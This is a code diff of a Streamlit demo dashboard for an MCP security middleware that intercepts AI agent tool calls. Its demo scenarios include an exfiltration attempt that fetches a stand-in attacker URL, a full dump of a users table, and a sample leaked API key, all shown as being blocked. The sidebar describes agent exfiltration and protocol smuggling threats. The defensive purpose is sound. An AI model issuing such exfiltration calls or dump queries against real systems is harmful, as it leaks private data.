@@ -35,10 +35,8 @@ SERVER_SCRIPT = os.path.join(os.path.dirname(__file__), "vulnerable_server.py")
 
 # Helper functions for "Real Info"
 def get_policy_hash():
-    if not os.path.exists(POLICY_PATH):
-        return "N/A"
-    with open(POLICY_PATH, "rb") as f:
-        return hashlib.sha256(f.read()).hexdigest()[:8].upper()
+    if not os.path.exists(POLICY_PATH): return "N/A"
+    with open(POLICY_PATH, "rb") as f: return hashlib.sha256(f.read()).hexdigest()[:8].upper()
 
 def get_resource_stats():
     process = psutil.Process(os.getpid())
@@ -53,207 +51,155 @@ st.set_page_config(
     initial_sidebar_state="expanded"
 )
 
-# --- ULTRA POLISHED DARK TERMINAL THEME ---
+# --- THE "ULTRA CLEAN" RED TEAM THEME ---
 st.markdown("""
 <style>
     @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
 
     html, body, [data-testid="stAppViewContainer"] {
-        background-color: #050505;
+        background-color: #030303;
         color: #e0e0e0;
         font-family: 'JetBrains Mono', monospace;
     }
     
+    /* REMOVE ALL STREAMLIT DEFAULTS */
+    header[data-testid="stHeader"] { display: none !important; }
+    footer { display: none !important; }
+    #MainMenu { display: none !important; }
+    [data-testid="stToolbar"] { display: none !important; }
+    
     .stMarkdown, .stText, p, h1, h2, h3, h4, label, .stRadio label {
         font-family: 'JetBrains Mono', monospace !important;
     }
-    /* Explicitly exclude Streamlit icons from global font override */
-    [data-testid="stIcon"], .main-svg, span:has(svg), .st-emotion-cache-1vt4y6f {
-        font-family: inherit !important;
+    
+    /* Robust fix for Streamlit icons */
+    span[data-testid="stIcon"], i[class*="material-icons"], .st-emotion-cache-1vt4y6f {
+        font-family: "Source Sans Pro", sans-serif !important;
     }
 
-    header[data-testid="stHeader"] {
-        background: rgba(0,0,0,0);
-    }
-
-    /* Command Center Container */
-    .terminal-window {
-        background: #0a0a0a;
-        border: 1px solid #222;
-        border-radius: 4px;
-        padding: 20px;
-        box-shadow: 0 4px 50px rgba(0,0,0,0.5);
-        margin-bottom: 20px;
-    }
-
+    /* Terminal Windows */
     .terminal-header {
-        color: #666;
-        font-size: 0.7rem;
+        color: #ff3333;
+        font-size: 0.75rem;
         text-transform: uppercase;
         letter-spacing: 2px;
-        margin-bottom: 20px;
+        margin-bottom: 25px;
         border-bottom: 1px solid #1a1a1a;
-        padding-bottom: 10px;
-        display: flex;
-        justify-content: space-between;
+        padding-bottom: 12px;
+        font-weight: 700;
     }
 
     .output-block {
-        background: #0d0d0d;
+        background: #080808;
+        border: 1px solid #111;
         border-left: 2px solid #222;
-        padding: 15px;
-        font-size: 0.85rem;
-        margin: 10px 0;
-        line-height: 1.6;
+        padding: 18px;
+        font-size: 0.82rem;
+        margin: 12px 0;
+        line-height: 1.7;
+        border-radius: 2px;
     }
     
     .status-denied { color: #ff3333; border-left-color: #ff3333; }
-    .status-warning { color: #ffaa00; border-left-color: #ffaa00; }
+    .status-warning { color: #ff3333; border-left-color: #ff3333; }
     .status-allowed { color: #33ff66; border-left-color: #33ff66; }
-    .status-info { color: #33ccff; border-left-color: #33ccff; }
 
     .stButton>button {
         background-color: #000;
         color: #fff;
-        border: 1px solid #33ff66;
+        border: 1px solid #ff3333;
         border-radius: 2px;
         font-family: 'JetBrains Mono', monospace;
-        letter-spacing: 1px;
+        letter-spacing: 1.5px;
         text-transform: uppercase;
-        transition: all 0.2s;
-        width: 100%;
-        padding: 10px;
+        transition: all 0.25s ease;
+        padding: 12px;
+        font-size: 0.8rem;
     }
     .stButton>button:hover {
-        background-color: #33ff66;
+        background-color: #ff3333;
         color: #000 !important;
-        box-shadow: 0 0 20px rgba(51, 255, 102, 0.4);
+        box-shadow: 0 0 30px rgba(255, 51, 51, 0.4);
     }
 
     .stTextArea textarea {
-        background-color: #0a0a0a !important;
+        background-color: #050505 !important;
         color: #33ff66 !important;
-        border: 1px solid #222 !important;
+        border: 1px solid #111 !important;
         font-family: 'JetBrains Mono', monospace !important;
         font-size: 0.8rem;
+        border-radius: 2px;
     }
     
-    .stRadio label {
-        color: #888 !important;
-    }
-    .stRadio div[data-testid="stMarkdownContainer"] p {
-        color: #e0e0e0 !important;
-    }
+    .stRadio label { color: #555 !important; font-size: 0.85rem; }
+    .stRadio div[data-testid="stMarkdownContainer"] p { color: #ccc !important; font-weight: 700; font-size: 0.9rem; }
 
-    .step-log {
-        color: #555;
-        font-size: 0.75rem;
-        margin: 2px 0;
-    }
-    .step-log-tag {
-        color: #33ff66;
-        font-weight: bold;
-    }
+    .step-log { color: #444; font-size: 0.72rem; margin: 3px 0; }
+    .step-log-tag { color: #33ff66; font-weight: bold; }
 
-    /* Sidebar Styling */
+    /* Sidebar Refinement */
     section[data-testid="stSidebar"] {
-        background-color: #080808 !important;
-        border-right: 1px solid #1a1a1a;
+        background-color: #020202 !important;
+        border-right: 1px solid #111;
     }
-    section[data-testid="stSidebar"] [data-testid="stMarkdownContainer"] h2 {
+    section[data-testid="stSidebar"] h2 {
         color: #ff3333;
-        font-size: 1rem;
+        font-size: 0.95rem;
         letter-spacing: 1px;
-        border-bottom: 1px solid #222;
-        padding-bottom: 10px;
-        margin-top: 30px;
+        border-bottom: 2px solid #1a1a1a;
+        padding-bottom: 12px;
+        margin-top: 35px;
+        font-weight: 700;
     }
     .sec-card {
-        background: #0d0d0d;
-        border: 1px solid #1a1a1a;
-        padding: 12px;
-        margin-bottom: 15px;
-        border-radius: 4px;
-        border-left: 2px solid #ff3333; /* Red indicator */
+        background: #060606;
+        border: 1px solid #111;
+        padding: 15px;
+        margin-bottom: 18px;
+        border-left: 2px solid #ff3333;
     }
     .sec-tag {
         color: #ff3333;
-        font-size: 0.6rem;
-        font-weight: bold;
+        font-size: 0.65rem;
+        font-weight: 700;
         text-transform: uppercase;
-        margin-bottom: 5px;
+        margin-bottom: 8px;
         display: block;
     }
-    .sec-desc {
-        font-size: 0.75rem;
-        color: #888;
-        line-height: 1.4;
-    }
+    .sec-desc { font-size: 0.75rem; color: #777; line-height: 1.5; }
 </style>
 """, unsafe_allow_html=True)
 
-# --- SIDEBAR INTERFACE ---
+# --- SIDEBAR: SECURITY INTELLIGENCE ---
 with st.sidebar:
     st.markdown("## SECURITY ADVISORY")
-    
-    st.markdown("""
-        <div class="sec-card">
-            <span class="sec-tag">VULNERABILITY: RLS_BYPASS</span>
-            <div class="sec-desc">
-                Mitigates <b>CVE-2025-48757</b>. Traditional DB wrappers often allow unrestricted SQL execution. Lilith enforces argument-level predicates (e.g., mandatory aggregations) before tool invocation.
-            </div>
-        </div>
-        
-        <div class="sec-card">
-            <span class="sec-tag">THREAT: AGENT_EXFILTRATION</span>
-            <div class="sec-desc">
-                Blocks the <b>Lethal Trifecta</b>: (Access Private Data) + (Access Untrusted Source) + (External Communication). Lilith tracks session-bound taints to identify data leakage paths.
-            </div>
-        </div>
-
-        <div class="sec-card">
-            <span class="sec-tag">ATTACK: JSON_SMUGGLING</span>
-            <div class="sec-desc">
-                Hardens the MCP protocol layer. Enforces strict <b>Content-Length</b> framing and LSP-style headers to prevent desynchronization and protocol-level orchestration attacks.
-            </div>
-        </div>
-    """, unsafe_allow_html=True)
+    sidebar_intel = [
+        ("RLS_BYPASS", "Mitigates <b>CVE-2025-48757</b>. Lilith enforces argument-level predicates like mandatory aggregations before SQL execution."),
+        ("AGENT_EXFILTRATION", "Blocks the <b>Lethal Trifecta</b>: (Private Access) + (Untrusted Source) + (Egress). Tracks session-bound taints."),
+        ("JSON_SMUGGLING", "Enforces strict <b>Content-Length</b> framing to prevent protocol-level desynchronization and orchestration attacks.")
+    ]
+    for tag, desc in sidebar_intel:
+        st.markdown(f'<div class="sec-card"><span class="sec-tag">{tag}</span><div class="sec-desc">{desc}</div></div>', unsafe_allow_html=True)
 
     st.markdown("## CORE ARCHITECTURE")
-    
-    st.markdown("""
-        <div class="sec-card">
-            <span class="sec-tag">TECH_STRENGTH: RUST_RUNTIME</span>
-            <div class="sec-desc">
-                <b>Language & Framework Agnostic</b>. Unlike code-level libraries, Lilith is a standalone binary that interposes at the transport layer, making it impossible for the agent to bypass security by subverting the runtime.
-            </div>
-        </div>
+    sidebar_arch = [
+        ("RUST_RUNTIME", "Standalone binary interposing at the transport layer, effectively creating a zero-trust execution boundary."),
+        ("FAIL_CLOSED", "Fail-closed architecture ensure total session termination on any policy mismatch or internal processing error."),
+        ("HMAC_SIGNING", "Every security decision is cryptographically signed using HMAC-SHA256, ensuring audit trail integrity.")
+    ]
+    for tag, desc in sidebar_arch:
+        st.markdown(f'<div class="sec-card"><span class="sec-tag">TECH_STRENGTH: {tag}</span><div class="sec-desc">{desc}</div></div>', unsafe_allow_html=True)
 
-        <div class="sec-card">
-            <span class="sec-tag">TECH_STRENGTH: FAIL_CLOSED</span>
-            <div class="sec-desc">
-                <b>Zero-Trust Defaults</b>. If a policy is missing, corrupted, or if an evaluation error occurs, Lilith terminates the upstream process immediately, preventing unprotected tool usage.
-            </div>
-        </div>
-
-        <div class="sec-card">
-            <span class="sec-tag">TECH_STRENGTH: HMAC_SIGNING</span>
-            <div class="sec-desc">
-                <b>Non-Repudiation</b>. Every security decision and log entry is cryptographically signed using HMAC-SHA256, ensuring that audit trails remain intact and verifiable.
-            </div>
-        </div>
-    """, unsafe_allow_html=True)
-
-# Main Application Frame
-st.markdown("""
-    <div style='display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 40px;'>
+# Header Module
+st.markdown(f"""
+    <div style='display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 60px; padding-top: 20px;'>
         <div>
-            <h1 style='margin: 0; font-weight: 700; font-size: 1.5rem; letter-spacing: -1px;'>LILITH<span style='color: #ff3333;'>ZERO</span></h1>
-            <p style='color: #555; font-size: 0.7rem; margin: 0;'>SECURE MCP MIDDLEWARE // ARCHITECTURAL VERSION 0.1.1</p>
+            <h1 style='margin: 0; font-weight: 700; font-size: 2rem; letter-spacing: -2px;'>LILITH<span style='color: #ff3333;'>ZERO</span></h1>
+            <p style='color: #444; font-size: 0.75rem; margin: 0; letter-spacing: 1px; font-weight: 700;'>SECURE MCP MIDDLEWARE // ARCHITECTURAL VERSION 0.1.1</p>
         </div>
         <div style='text-align: right;'>
-            <p style='color: #ff3333; font-size: 0.7rem; margin: 0;'>[ SYSTEM: ONLINE ]</p>
-            <p style='color: #555; font-size: 0.7rem; margin: 0;'>ENFORCEMENT MODE: ACTIVE</p>
+            <p style='color: #ff3333; font-size: 0.8rem; margin: 0; font-weight: 700;'>[ SYSTEM: ONLINE ]</p>
+            <p style='color: #444; font-size: 0.7rem; margin: 0; font-weight: 700;'>ENFORCEMENT MODE: ACTIVE</p>
         </div>
     </div>
 """, unsafe_allow_html=True)
@@ -261,22 +207,17 @@ st.markdown("""
 col_config, col_main = st.columns([1, 2], gap="large")
 
 with col_config:
-    st.markdown('<div class="terminal-header" style="color: #ff3333">Routing & Policy</div>', unsafe_allow_html=True)
-    
+    st.markdown('<div class="terminal-header">Routing & Policy Config</div>', unsafe_allow_html=True)
     if os.path.exists(POLICY_PATH):
-        with open(POLICY_PATH, "r") as f:
-            policy_content = f.read()
-        
-        updated_policy = st.text_area("POLICY_DEFINITION.YAML", value=policy_content, height=450, label_visibility="collapsed")
-        
-        if updated_policy != policy_content:
-            if st.button("Hot-Reload Policy"):
-                with open(POLICY_PATH, "w") as f:
-                    f.write(updated_policy)
+        with open(POLICY_PATH, "r") as f: pol_text = f.read()
+        updated_pol = st.text_area("POL", value=pol_text, height=480, label_visibility="collapsed")
+        if updated_pol != pol_text:
+            if st.button("Commit Policy Change"):
+                with open(POLICY_PATH, "w") as f: f.write(updated_pol)
                 st.rerun()
     
     st.markdown(f"""
-        <div style='color: #444; font-size: 0.7rem; margin-top: 20px; line-height: 1.8;'>
+        <div style='color: #333; font-size: 0.65rem; margin-top: 30px; line-height: 2;'>
             UPSTREAM_TYPE: PYTHON_MCP<br>
             SANDBOX_TIER: 2 (RESTRICTED)<br>
             ISOLATION_ENGINE: RUST_L3Z_CORE<br>
@@ -285,127 +226,70 @@ with col_config:
     """, unsafe_allow_html=True)
 
 with col_main:
-    st.markdown('<div class="terminal-header" style="color: #ff3333">Security Controller // Live Intercept</div>', unsafe_allow_html=True)
-    
-    scenario = st.radio(
-        "SELECT OPERATIONAL CONTEXT:",
-        [
-            "WITHOUT LILITH",
-            "DUMP DB TABLE",
-            "EXFILTRATION ATTEMPT",
-            "AUTHORIZED QUERY"
-        ],
-        label_visibility="collapsed"
-    )
-    
+    st.markdown('<div class="terminal-header">Security Controller // Live Intercept</div>', unsafe_allow_html=True)
+    scenario = st.radio("CONTEXT:", ["WITHOUT LILITH", "DUMP DB TABLE", "EXFILTRATION ATTEMPT", "AUTHORIZED QUERY"], label_visibility="collapsed")
     st.markdown("<br>", unsafe_allow_html=True)
     
     if st.button("Execute Intent"):
-        log_placeholder = st.empty()
-        output_placeholder = st.container()
-        
-        steps = []
-        def log_step(msg, delay=0.2):
+        log_ph, out_ph, steps = st.empty(), st.container(), []
+        def log(msg):
             steps.append(f"<div class='step-log'><span class='step-log-tag'>[INFO]</span> {msg}</div>")
-            log_placeholder.markdown("".join(steps), unsafe_allow_html=True)
-            time.sleep(delay)
+            log_ph.markdown("".join(steps), unsafe_allow_html=True); time.sleep(0.25)
 
         if "WITHOUT" in scenario:
-            log_step("Initializing direct tool access channel...")
-            log_step("Bypassing Lilith Zero middleware security...")
-            log_step("Establishing connection to legacy upstream server...")
-            with output_placeholder:
+            for m in ["Initializing direct access...", "Bypassing security middleware...", "Exposing legacy endpoint..."]: log(m)
+            with out_ph:
                 st.markdown(f"""
                     <div class="output-block status-warning">
-                        <span style='font-size: 0.7rem; font-weight: bold; color: #ffaa00;'>WARNING: SECURITY_DISABLED</span><br>
+                        <span style='font-size: 0.7rem; font-weight: bold; color: #ff3333;'>WARNING: SECURITY_DISABLED</span><br>
                         Baseline mode operates outside of the protected security perimeter.
                     </div>
                     <div class="output-block">
-                        <span style='font-size: 0.7rem; color: #666;'>UPSTREAM_RESPONSE:</span><br>
+                        <span style='font-size: 0.7rem; color: #444;'>UPSTREAM_RESPONSE:</span><br>
                         <code>[{{'id': 1, 'username': 'admin', 'api_key': 'sk_live_88374'}}]</code>
                     </div>
                 """, unsafe_allow_html=True)
         else:
-            async def run_op(tool, args):
+            async def run_intercept(t, a):
                 try:
-                    log_step("Mapping security policy: mcp-security-policy...")
-                    log_step(f"Verifying runtime binary: {os.path.basename(LILITH_BINARY)}...")
-                    
-                    async with Lilith(
-                        upstream=f"{sys.executable} {SERVER_SCRIPT}",
-                        policy=POLICY_PATH,
-                        binary=LILITH_BINARY
-                    ) as client:
-                        log_step("Spawning supervisor in Restricted Token sandbox...")
-                        log_step("Performing MCP handshake and session negotiation...")
-                        log_step("Context-aware security session established.")
-                        log_step(f"Intercepting tool call: {tool}({json.dumps(args)})")
-                        
-                        start_time = datetime.now()
-                        result = await client.call_tool(tool, args)
-                        latency = (datetime.now() - start_time).total_seconds() * 1000
-                        
-                        log_step("Policy evaluation complete: ALLOW")
-                        
-                        raw_text = result['content'][0]['text']
-                        clean_text = re.sub(r'<<<LILITH_ZERO_DATA_(START|END):[a-zA-Z0-9]+>>>', '', raw_text).strip()
-                        
-                        st.markdown(f"""
+                    for m in ["Mapping security policy...", f"Verifying {os.path.basename(LILITH_BINARY)}..."]: log(m)
+                    async with Lilith(upstream=f"{sys.executable} {SERVER_SCRIPT}", policy=POLICY_PATH, binary=LILITH_BINARY) as client:
+                        for m in ["Spawning isolation supervisor...", "MCP Handshake established.", "Context-aware session active.", f"Intercepting: {t}({json.dumps(a)})"]: log(m)
+                        start = datetime.now()
+                        res = await client.call_tool(t, a)
+                        lat = (datetime.now() - start).total_seconds() * 1000
+                        log("Evaluation: ALLOWED")
+                        txt = re.sub(r'<<<LILITH_ZERO_DATA_.*>>>', '', res['content'][0]['text']).strip()
+                        out_ph.markdown(f"""
                             <div class="output-block status-allowed">
                                 <span style='font-size: 0.7rem; font-weight: bold;'>SUCCESS: POLICY_COMPLIANT</span><br>
-                                Intent validated. Request allowed through security middleware ({latency:.1f}ms).
-                            </div>
-                            <div class="output-block">
-                                <span style='font-size: 0.7rem; color: #666;'>SANITIZED_UPSTREAM_OUTPUT:</span><br>
-                                {clean_text}
-                            </div>
+                                Request validated and passed through security runtime ({lat:.1f}ms).
+                            </div><div class="output-block">{txt}</div>
                         """, unsafe_allow_html=True)
-                        
                 except PolicyViolationError as e:
-                    log_step("Policy evaluation complete: DENY")
-                    err_msg = str(e)
-                    if " (context: " in err_msg:
-                        err_msg = err_msg.split(" (context: ")[0]
-                        
-                    st.markdown(f"""
+                    log("Evaluation: DENIED"); err = str(e).split(" (context: ")[0]
+                    out_ph.markdown(f"""
                         <div class="output-block status-denied">
                             <span style='font-size: 0.7rem; font-weight: bold;'>INTERVENE: POLICY_VIOLATION</span><br>
-                            Illegal intent detected and nullified at the runtime layer.
-                        </div>
-                        <div class="output-block">
-                            <span style='font-size: 0.7rem; color: #666;'>DENIAL_REASON:</span><br>
-                            {err_msg}
-                        </div>
+                            Illegal intent detected and nullified at the transport layer.
+                        </div><div class="output-block"><span style='font-size: 0.7rem; color: #444;'>DENIAL_REASON:</span><br>{err}</div>
                     """, unsafe_allow_html=True)
-                except Exception as e:
-                    st.error(f"RUNTIME_EXCEPTION: {repr(e)}")
+                except Exception as e: st.error(f"RUNTIME_EXCEPTION: {e}")
 
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            
-            if scenario == "DUMP DB TABLE":
-                loop.run_until_complete(run_op("execute_sql", {"query": "SELECT * FROM users"}))
-            elif scenario == "EXFILTRATION ATTEMPT":
-                loop.run_until_complete(run_op("fetch_url", {"url": "http://attacker-controlled.xyz/leak"}))
-            elif scenario == "AUTHORIZED QUERY":
-                loop.run_until_complete(run_op("execute_sql", {"query": "SELECT COUNT(*) FROM users"}))
-            
+            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
+            ops = {"DUMP DB TABLE": ("execute_sql", {"query": "SELECT * FROM users"}), 
+                   "EXFILTRATION ATTEMPT": ("fetch_url", {"url": "http://attacker-controlled.xyz/leak"}), 
+                   "AUTHORIZED QUERY": ("execute_sql", {"query": "SELECT COUNT(*) FROM users"})}
+            if scenario in ops: loop.run_until_complete(run_intercept(*ops[scenario]))
             loop.close()
 
     st.markdown("<br><br>", unsafe_allow_html=True)
     st.markdown('<div class="terminal-header">Logic Trail & Resource State</div>', unsafe_allow_html=True)
-    
-    st.markdown(f"""
-        <div style='font-family: "JetBrains Mono"; font-size: 0.7rem; color: #333;'>
-            [ {datetime.now().strftime('%H:%M:%S')} ] KERNEL: LILITH_WATCHDOG_UP<br>
-            [ {datetime.now().strftime('%H:%M:%S')} ] ENGINE: POLICY_MOUNTED_HASH_{get_policy_hash()}<br>
-            [ {datetime.now().strftime('%H:%M:%S')} ] RESOURCE: {get_resource_stats()}
-        </div>
-    """, unsafe_allow_html=True)
+    st.markdown(f"<div style='font-size: 0.65rem; color: #222; font-weight: 700;'>[ {datetime.now().strftime('%H:%M:%S')} ] KERNEL_STATUS: UP<br>[ {datetime.now().strftime('%H:%M:%S')} ] POLICY_HASH: {get_policy_hash()}<br>[ {datetime.now().strftime('%H:%M:%S')} ] RESOURCES: {get_resource_stats()}</div>", unsafe_allow_html=True)
 
-# Architectural Footer
+# Footer
 st.markdown("""
-<div style='margin-top: 100px; padding-top: 20px; border-top: 1px solid #111; display: flex; justify-content: space-between; font-size: 0.6rem; color: #222;'>
+<div style='margin-top: 100px; padding-top: 20px; border-top: 1px solid #111; display: flex; justify-content: space-between; font-size: 0.6rem; color: #111; font-weight: 700; letter-spacing: 1px;'>
     <div>LILITH_ZERO_CORE // BUILT_WITH_RUST</div>
     <div>ZERO_TRUST_MCP_ADAPTER</div>
     <div>AUTHENTICITY_VERIFIED_BAD_COMPANY</div>
